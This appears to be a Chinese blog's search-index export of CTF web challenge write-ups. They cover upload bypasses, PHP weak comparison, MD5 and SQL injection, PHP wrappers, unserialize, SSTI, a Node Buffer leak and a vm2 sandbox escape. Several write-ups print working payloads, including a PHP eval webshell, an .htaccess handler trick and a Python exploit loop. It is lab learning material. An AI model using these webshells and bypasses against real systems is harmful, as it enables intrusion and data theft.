src="/images/buu-wp(web)/38.png"></p><p>最终得到flag</p><h1>[极客大挑战 2019]Http</h1><p>首先打开靶机，查看源码</p><p><img src="/images/buu-wp(web)/39.png"></p><p>发现一个&#x2F;Srecret.php文件打开进行查看</p><p><img src="/images/buu-wp(web)/40.png"></p><p>他说你不是来自这个地址，根据题目可以想到http协议<br>进行抓包，更改Referer为这个地址</p><p><img src="/images/buu-wp(web)/41.png"></p><p>查看回显，发现他说请使用Syclover浏览器，那么再伪造用户</p><p><img src="/images/buu-wp(web)/42.png"></p><p>在查看回显，说你只能在本地阅读<br>那么我们可以伪造本地ip 127.0.0.1,所以我们可以利用X-Forwarded-For协议来伪造只需要在 header 添加 X-Forwarded-For:127.0.0.1，再次访问，这时得到flag</p><p><img src="/images/buu-wp(web)/43.png"></p><h1>[极客大挑战 2019]Upload</h1><p>打开靶场</p><p><img src="/images/buu-wp(web)/44.png"></p><p>文件上传类型的，先随便上传点文件进行查看回显</p><p><img src="/images/buu-wp(web)/45.png"></p><p>因为是文件上传类型的先上传一个一句话木马尝试一下</p><p><img src="/images/buu-wp(web)/46.png"></p><p><img src="/images/buu-wp(web)/47.png"></p><p>上传的php格式的一句话木马病毒被过滤了，所以使用phtml格式的一句话木马病毒</p><p><img src="/images/buu-wp(web)/48.png"></p><p>进行抓包</p><p><img src="/images/buu-wp(web)/49.png"></p><p>将Content-type处改为image&#x2F;jpeg，发送发现上传成功</p><p><img src="/images/buu-wp(web)/50.png"></p><p>现在需要知道文件的保存路径，一般都是&#x2F;upload，进行一下访问</p><p><img src="/images/buu-wp(web)/51.png"></p><p>查看一下刚才上传的文件，发现flag</p><p><img src="/images/buu-wp(web)/52.png"></p><h1>[极客大挑战 2019]Knife</h1><p>打开靶场看到如下信息</p><p><img src="/images/buu-wp(web)/53.png"></p><p>菜刀丢了，使用中国菜刀或者中国蚁剑，在这里使用中国蚁剑</p><p><img src="/images/buu-wp(web)/54.png"></p><p>添加数据，查看根目录，发现其中有flag文件，点击查看得到flag</p><p><img src="/images/buu-wp(web)/55.png"></p><p>flag{cd406a44-5d93-4dc3-982b-19ca714ab97c}</p><h1>[ACTF2020 新生赛]Upload</h1><p>打开靶场，看到灯泡提交文件，先随便提交一个文件看看过滤情况</p><p><img src="/images/buu-wp(web)/56.png"></p><p>看来是白名单过滤，打开brup进行抓包查看，提交文件</p><p><img src="/images/buu-wp(web)/57.png"></p><p>发现并没有抓到包，推测应该是前端认证，提交一句话木马病毒，更改后缀名，查看抓包</p><p><img src="/images/buu-wp(web)/58.png"></p><p>进行更改后缀名为php发现不行，推测还有后端验证，那么这种情况下，尝试.phtml文件绕过验证（phtml是php文件的网页解析文件）使用brup抓包一句话木马病毒，用brup进行后缀名的更改，发现最后上传成功了</p><p><img src="/images/buu-wp(web)/59.png"></p><p>打开这个链接进行查看</p><p><img src="/images/buu-wp(web)/60.png"></p><p>发现为白色证明上传成功，打开中国蚁剑，进行连接</p><p><img src="/images/buu-wp(web)/61.png"></p><p>最终在根目录中找到flag文件，得到该题的flag</p><p><img src="/images/buu-wp(web)/62.png"></p><h1>[ACTF2020 新生赛]BackupFile</h1><p>打开靶机，backupfile的意思是备份文件的意思<br>用dirsearch扫描</p><p><img src="/images/buu-wp(web)/63.png"></p><p>发现一个index.php.bak的文件，进行下载，发现是一个代码审计</p><p><img src="/images/buu-wp(web)/64.png"></p><p>最关键的是</p><p>$key &#x3D; intval($key);<br>    $str &#x3D; “123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”;<br>    if($key &#x3D;&#x3D; $str) {<br>        echo $flag;</p><p>因为key&#x3D;&#x3D;str是一个弱比较，所以只需要令key&#x3D;123即可<br>（在PHP中：<br>&#x3D; &#x3D; 为弱相等，即当整数和字符串类型相比较时。会先将字符串转化为整数然后再进行比较。比如a&#x3D;123和b&#x3D;123admin456进行&#x3D; &#x3D;比较时。则b只会截取前面的整数部分。即b转化成123。所以，这里的a &#x3D; &#x3D; b是返回True。）</p><p>构造playload&#x2F;index.php.bak?key&#x3D;123<br>得到flag</p><p><img src="/images/buu-wp(web)/65.png"></p><h1>[RoarCTF 2019]Easy Calc</h1><p>打开靶机</p><p><img src="/images/buu-wp(web)/66.png"></p><p>发现有WAF(Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）)<br>发现源码中有一个calc.php进行查看</p><p><img src="/images/buu-wp(web)/67.png"></p><p>源码有过滤，这里只能输入数字不能输入英文，但是我们要查flag该怎么办</p><p>正则匹配：&#x2F;m 表示多行匹配<br>PHP字符串解析特性绕过WAF<br>输入时发现num只能输入数字，输入字符无法解析。<br>PHP需要将所有参数转换为有效变量名，因此在解析查询字符串时，它会做两件事：1，删除空白字符；2，将某些字符转换为下划线（包括空格）<br>现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样代码还能正常运行，还上传了非法字符。</p><p>scandir()函数：返回指定目录中的文件和目录的数组</p><p>var_dump()：输出变量的相关信息</p><p>构造playload（在num变量前面加空格绕过认证，scandir(“&#x2F;“）能够扫描根目录，但过滤了&#x2F;，那么就要ascii码来绕过</p><p><img src="/images/buu-wp(web)/68.png"></p><p>发现了f1agg文件<br>那么再次构造playload得到flag</p><p><img src="/images/buu-wp(web)/69.png"></p><h1>[极客大挑战 2019]BuyFlag</h1><p>打开靶场，查看页面，发现要求必须是学生并且必须钱够买flag<br>摁ctrl u进行查看源代码发现</p><p><img src="/images/buu-wp(web)/70.png"></p><p>进行代码审计，需要POST提交一个password参数，必须是非数字并且为404<br>进行抓包查看</p><p><img src="/images/buu-wp(web)/71.png"></p><p>发现一个user&#x3D;0将其数字进行更改，改为1时发现登录为学生</p><p><img src="/images/buu-wp(web)/72.png"></p><p>以POST方式提交password参数为404a，源代码显示是一个弱比较，所以可以是成为为404并且不是数字<br>发现登录成功，那么就开始提交money参数，输入钱发现太长，少了则显示钱不足，那么尝试用数组绕过，发现可以，得到flag</p><p><img src="/images/buu-wp(web)/73.png"></p><h1>[BJDCTF2020]Easy MD5</h1><p>首先我们打开靶场看到一个查询框，输入任何东西均无回显</p><p><img src="/images/buu-wp(web)/74.png"></p><p>查看源代码，看到hint中有提示</p><p><img src="/images/buu-wp(web)/75.png"></p><p>发现是sql注入，select * from ‘admin’ where password&#x3D;md5($pass,true)<br>password返回值为“or 1”的时候为一个永真的的词条<br>看了大佬博客，这个可以用ffifdyop绕过，绕过原理是：<br>ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6<br>而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from ‘admin’ where password&#x3D;’’ or ‘6xxxxx’，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。<br>果然，我们提交之后就绕过了这个，来到了另一个页面</p><p><img src="/images/buu-wp(web)/76.png"></p><p>点击ctrl+U查看源代码</p><p><img src="/images/buu-wp(web)/77.png"></p><p>开始进行代码审计，发现以get的方式提供一个a和b，a和b的值不相等,但是a和b的MD5的值要相等<br>这里提供两个QNKCDZO和s878926199a<br>构造playload<br><a href="http://37d8016d-643c-4764-8e62-c8a24e224a75.node3.buuoj.cn/levels91.php?a=QNKCDZO&b=s878926199a">http://37d8016d-643c-4764-8e62-c8a24e224a75.node3.buuoj.cn/levels91.php?a=QNKCDZO&amp;b=s878926199a</a></p><p><img src="/images/buu-wp(web)/78.png"></p><p>来到该页面，继续进行代码审计，要用post提交两个变量，并且是强比较类型，两个变量不相等，但MD5的值要完全相等<br>MD5有个特点是：如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到&#x3D;&#x3D;&#x3D;强比较的值相等<br>payload<br>param1[]&#x3D;1&amp;param2[]&#x3D;2即可（用数组的方式来绕过验证）</p><p><img src="/images/buu-wp(web)/79.png"></p><p>最终得到flag</p><h1>[HCTF 2018]admin</h1><p>打开靶场，发现有一个登录界面</p><p><img src="/images/buu-wp(web)/80.png"></p><p>以admin为用户名进行注册，发现该用户名已经被注册了，推测该题为弱口令爆破</p><p><img src="/images/buu-wp(web)/81.png"></p><p>用bp进行抓包，导入密码字典进行抓包，发送到intruder进行爆破</p><p><img src="/images/buu-wp(web)/82.png"></p><p>发现123的返回值长度不一样，那么这个就应该是密码了</p><p><img src="/images/buu-wp(web)/83.png"></p><p>登录成功得到flag</p><h1>[MRCTF2020]你传你🐎呢</h1><p>打开靶机</p><p><img src="/images/buu-wp(web)/84.png"></p><p>先上传一个一句话木马<?php @eval($_POST['attack']) ?><br>并且抓包</p><p><img src="/images/buu-wp(web)/85.png"></p><p><img src="/images/buu-wp(web)/86.png"></p><p>上传成功，但传入的是一个jpg文件，我们需要将他转成php文件<br>所以上一个htaccess文件写入SetHandler application&#x2F;x-httpd-php</p><p><img src="/images/buu-wp(web)/87.png"></p><p><img src="/images/buu-wp(web)/88.png"></p><p>连接蚁剑</p><p><img src="/images/buu-wp(web)/89.png"></p><p>在根目录下找到flag文件</p><p><img src="/images/buu-wp(web)/90.png"></p><p>得到flag</p><h1>[ZJCTF 2019]NiZhuanSiWei</h1><p>打开靶场</p><p><img src="/images/buu-wp(web)/91.png"></p><p>进行代码审计，首先第一个绕过让提交text，其值为welcome to the zjctf<br>我们可以用data伪协议来进行提交，并且以防万一进行一个base64编码<br>最终构造playload为<br>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</p><p><img src="/images/buu-wp(web)/92.png"></p><p>绕过成功，进行第二个绕过，include函数，并且有useless.php的提示，所以用php:&#x2F;&#x2F;fillter伪协议进行绕过<br>构建playload<br>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p><p><img src="/images/buu-wp(web)/93.png"></p><p>发现绕过成功，对回显进行解码得到</p><p><img src="/images/buu-wp(web)/94.png"></p><p>在本地进行序列化操作</p><?phpclass Flag{  //flag.php      public $file="flag.php";      public function __tostring(){          if(isset($this->file)){              echo file_get_contents($this->file);             echo "<br>";        return ("U R SO CLOSE !///COME ON PLZ");        }      }  }  $a=new Flag();echo serialize($a);?><p>序列化后得到</p><p>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><p>构造playload:<br>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><p><img src="/images/buu-wp(web)/95.png"></p><p>绕过成功，摁f12查看，得到flag</p><p><img src="/images/buu-wp(web)/96.png"></p><h1>[MRCTF2020]Ez_bypass</h1><p>首先打开靶场</p><p><img src="/images/buu-wp(web)/97.png"></p><p>太乱了，摁ctrl+u进行查看</p><p><img src="/images/buu-wp(web)/98.png"></p><p>进行代码审计<br>首先让以GET的方式提交id和gg参数，两个参数不能相等，但md5值要相等并且是一个强比较，所以构造数组进行绕过  id[]&#x3D;1&amp;gg[]&#x3D;2</p><p>查看回显发现绕过成功</p><p>那么进行下一步代码审计，让以POST方式提交一个passwd参数，并且passwd不能是一个数字串，但是是一个弱类型的比较，所以我们构造passwd&#x3D;1234567a来进行绕过，首先用bp进行抓包，提交参数</p><p><img src="/images/buu-wp(web)/99.png"></p><p>查看回显，发现成功，打印出了flag</p><p><img src="/images/buu-wp(web)/100.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssti-shrine</title>
    <link href="/2025/02/06/ssti-shrine/"/>
    <url>/2025/02/06/ssti-shrine/</url>
    
    <content type="html"><![CDATA[<p>这是训练赛中的一道题，同时也是buu中的一道题在这里一块进行记录</p><p>打开靶机，发现直接给了我们源码</p><p><img src="/images/shrine/1.png"></p><p>通过代码，我们可以访问一下shrine路径，看看是否有ssti漏洞。测试一下 构造shrine&#x2F;9</p><p><img src="/images/shrine/2.png"></p><p>发现3*3被计算出来的，说明这里有ssti漏洞</p><p>我们可以使用查看一下配置文件，这样也可以看到app.config也就可以看到。</p><p>不过经过了尝试之后发现这道题中设置了黑名单,其中有config。</p><p>但是在python里，有很多内置函数，其中就有一个url_for函数，其作用就是给指定的函数构造URL。</p><p>配合globals()，该函数会以字典类型返回了当前位置的全部全局变量。</p><p>通过这种方式也可以实现查看的效果。</p><p>构造playload: </p><p><img src="/images/shrine/7.png"></p><p><img src="/images/shrine/3.png"></p><p>在其中你就可以发现，里面有一个current_app’:&lt;Flask’app’&gt;</p><p><img src="/images/shrine/4.png"></p><p>这里的current就是就是指的是当前的app，这样我们只需要查看这个config就可以查看到flag了</p><p>那么构造playload：</p><p><img src="/images/shrine/6.png"></p><p><img src="/images/shrine/5.png"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu-Leaking</title>
    <link href="/2025/02/06/buu-Leaking/"/>
    <url>/2025/02/06/buu-Leaking/</url>
    
    <content type="html"><![CDATA[<p>学校的训练赛中出现了这道题，现在找到原题来做一下</p><p>[HITCON 2016]Leaking-nodejsVM沙箱逃逸</p><p>打开靶机，查看源代码</p><p><img src="/images/buu-Leaking/1.png"></p><p>分析一下这段代码<br>这一段代码很明显是最重要的代码</p><p><img src="/images/buu-Leaking/2.png"></p><p>其中</p><p>  &#x2F;*    Orange is so kind so he put the flag here. But if you can guess correctly :P    *&#x2F;<br>    eval(“var flag_” + randomstring.generate(64) + “ &#x3D; &quot;hitcon{“ + flag + “}&quot;;”)</p><p>这一段看注释可以知道，在这里生成了flag</p><p>if (req.query.data &amp;&amp; req.query.data.length &lt;&#x3D; 12) {<br>        var vm &#x3D; new VM({<br>            timeout: 1000<br>        });<br>        console.log(req.query.data);<br>        res.send(“eval -&gt;” + vm.run(req.query.data));</p><p>这一段，对我们传入的值进行长度判断，判断是否小于等于12，如果符合就会进入沙盒运行，这里可以用数组进行绕过</p><p>exp:</p><p>import requests</p><p>session &#x3D; requests.Session()<br>session.trust_env &#x3D; False<br>while True:<br>    response &#x3D; session.get(‘<a href="http://1e0ac859-1ead-4ec5-9ecd-c1aec42d861c.node5.buuoj.cn:81/?data=Buffer(9999)">http://1e0ac859-1ead-4ec5-9ecd-c1aec42d861c.node5.buuoj.cn:81/?data=Buffer(9999)</a>‘)<br>    if “flag” in response.text:<br>        print(response.text)<br>        break</p><p><img src="/images/buu-Leaking/3.png"></p><p>总结：<br>分析一下这道题的考点是涉及远古版本的node内存分配的问题，远古版本的node中Buffer就是内存分配的，并且重新分配之后不会进行初始化。<br>意味着之前加载的内存被回收之后还会被重新分配出来，并且不会初始化，原始数据还留在那里。。<br>外国老哥分许的原因</p><p><img src="/images/buu-Leaking/4.png"></p><p>所以使用new Buffer(size)或其别名Buffer(size)创建,则对象不会填充，但是只要是调用过的变量，一定会存在内存中，所以需要使用Buffer()来读取内存，使用data&#x3D;Buffer(9999)分配一个9999的单位为8位字节的buffer，因此能得到姿势</p><p>在早时期的版本node，当Buffer传入一个数字，就会得到这个长度的buffer，并且这个buffer是没有进行初始化的。8.0之后的版本，可以通过Buffer.allocUnsafe(size)<br>这个函数来得到未初始化的数据</p>]]></content>
    
    
    <categories>
      
      <category>原创</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu-[HFCTF2020]JustEscape wp</title>
    <link href="/2025/01/24/sandbox/"/>
    <url>/2025/01/24/sandbox/</url>
    
    <content type="html"><![CDATA[<p>这是一道Node,js沙盒逃逸的题目，根据大佬们的wp做的，记录一下做题的过程以及学习到的相应的知识点</p><h1>信息查看</h1><p>打开环境:</p><p><img src="/images/sandbox/sand1.png"></p><p>可以看到里面有一些提示，比如说 真的是php吗</p><p>打开&#x2F;run.php进行查看发现里面有一个eval()函数</p><p><img src="/images/sandbox/sand2.png"></p><p>这个函数除了php中有，Node.js中也含有这个函数，结合提示信息推测应该是Node.js。于是尝试利用Error().stack来进行查看<br>页面回显了一堆报错信息</p><p><img src="/images/sandbox/sand3.png"></p><p>根据这些信息可以推断这道题目是一个vm的沙盒逃逸</p><p>那么接下来把demo的那个请求参数放到url中进行查看。</p><p><img src="/images/sandbox/sand4.png"></p><p>发现没有回显，那么推测就是可能有黑名单检测机制，尝试输入其他的node.js语句，发现一下字符串被列入了黑名单</p><ol>  <li> ' </li>  <li> " </li>  <li> + </li>  <li> process </li>  <li> constructor </li>  <li> exec </li></ol><h1>bypass 黑名单机制</h1><p>首先是单引号或者双引号，我的代码需要用到它们，但都被禁用了，我选择用 &#96;&#96; 代替单双引号声明字符串。</p><p>process、constructor 和 exec 都是被用于命名方法或者属性的标识符，它们本身不是字符串，但是由于在 JavaScript 中，除了可以通过 . 访问属性和方法，还可以通过中括号 [] 访问，中括号里面是方法或属性的字符串名称</p><p>对于黑名单中的字符串我们可以用concat连接字符串</p><p>绕过的形式类似于a[<code>proces</code>.concat(<code>s</code>)]</p><h1>绕过沙盒执行系统的命令</h1><p>根据之前的Error().stack报错信息进行查看发现vm2的模块</p><p>在snyk网站上找到poc</p><p><img src="/images/sandbox/sand5.png"></p><p>根据之前得到得到各种信息在本地进行一下修改</p><p><img src="/images/sandbox/sand6.png"></p><p>主要是将黑名单的字符串进行了修改。修改完成之后将代码复制到地址栏中访问</p><p><img src="/images/sandbox/sand7.png"></p><p>这样就得到了flag</p><h1>总结</h1>根据这道题目学会了沙盒逃逸的一些简单的知识点，以及一些js的知识<p>Javascript声明字符串的几种方式：</p><ol>  <li>单引号 ' </li>  <li>双引号 " </li>  <li>反引号 ` </li>  <li>Buffer.form()</li>  <li>正则表达式，然后 toString() 得到字符串，再 substring() 去掉左右的 /，例如： /apple/.toString().substring(1,6)</li></ol><p>JavaScript拼接字符串的方式：</p><ol>  <li>加号 +</li>  <li>String.concat()方。如'pronces.concat('s')</li></ol><p>JavaScript可以用点号或者中括号访问属性的方法：</p><ol>  <li>this.constuctor</li>  <li>this['constructor']</li></ol><p>Error 对象的 stack 属性可以返回调用栈，包括程序文件的路径，利用这点查看用的哪个沙盒模块。</p><p>其他的知识点暂时需要深入学习。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学习笔记 day1</title>
    <link href="/2025/01/22/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/"/>
    <url>/2025/01/22/%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%BF%97/</url>
    
    <content type="html"><![CDATA[<p>今天开始记录学习日常，今天学习html</p><h1>一.简介</h1><p>HTML 是用来描述网页的一种语言。<br>HTML 指的是超文本标记语言: HyperText Markup Language<br>HTML 不是一种编程语言，而是一种标记语言<br>标记语言是一套标记标签 (markup tag)<br>HTML 使用标记标签来描述网页<br>HTML 文档包含了HTML 标签及文本内容<br>HTML文档也叫做 web 页面</p><p>这是一段实例<br><img src="/images/html/html1.png"></p><h1>二.HTML基础</h1>HTML分为四个基础部分<h2>1.HTML标题</h2>HTML标题是通过< h1>--< h6>标签来进行定义的,并且通过这种形式结束该语句<p>实例<br>&lt; h1&gt;这是一个标题&lt; &#x2F;h1&gt;<br>&lt; h2&gt;这是第二个标题&lt; &#x2F;h2&gt;</p><h2>2.HTML段落</h2>HTML段落是通过标签< p>来定义的，同样用< /p>这种形式来结束该语句<p>实例<br>&lt; p&gt;这是一个段落&lt; &#x2F;p&gt;<br>&lt; p&gt;这是另一个段落&lt; &#x2F;p&gt;</p><h2>3.HTML连接</h2>HTML连接是通过< a>来定义的语句形式是< a href="www.---">这是一个连接<p>实例<br>&lt; a href&#x3D;”<a href="https://www.qfnu.edu.cn/%22%3E%E8%BF%99%E6%98%AF%E6%9B%B2%E9%98%9C%E5%B8%88%E8%8C%83%E5%A4%A7%E5%AD%A6%E7%9A%84%E5%AE%98%E7%BD%91%E8%BF%9E%E6%8E%A5">https://www.qfnu.edu.cn/&quot;&gt;这是曲阜师范大学的官网连接</a>&lt; &#x2F;a&gt;</p><h2>4,HTML图像</h2>HTML图像是通过标签<img>来定义的<p>实例<br>&lt; img src&#x3D;”&#x2F;images&#x2F;logo.png” width&#x3D;”258” height&#x3D;”39” &#x2F;&gt;</p><p>注意图像的名称和尺寸是以属性的形式提供的！！！</p>]]></content>
    
    
    <categories>
      
      <category>html</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>后门查杀</title>
    <link href="/2024/12/03/houmen/"/>
    <url>/2024/12/03/houmen/</url>
    
    <content type="html"><![CDATA[<p>一.需要用到的工具</p><p>D盾&#x2F;火绒安全</p><p>二.1.后门查杀</p><p>下载文件，用火绒安全进行查杀</p><p><img src="/images/1.png" alt="123"></p><p>点开这个病毒文件，用记事本打开，发现里面有一串md5加密的字符串，推测这个就是我们要找的flag，发现成功提交</p><p><img src="/images/2.png" alt="2"></p><p>flag为</p><p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p><p>2.webshell后门</p><p>和前一题一样下载文件用火绒进行查杀</p><p><img src="/images/3.png" alt="3"></p><p>查找到两个后门病毒，打开进行查看</p><p>![4images&#x2F;4.png)</p><p>发现一段md5加密的字符串，推测这个就是flag</p><p>flag{ba8e6c6f35a53933b871480bb9a9545c}</p><p>三.总结</p><p>通过这两个题，学会了使用D盾&#x2F;火绒进行后门类的题目</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
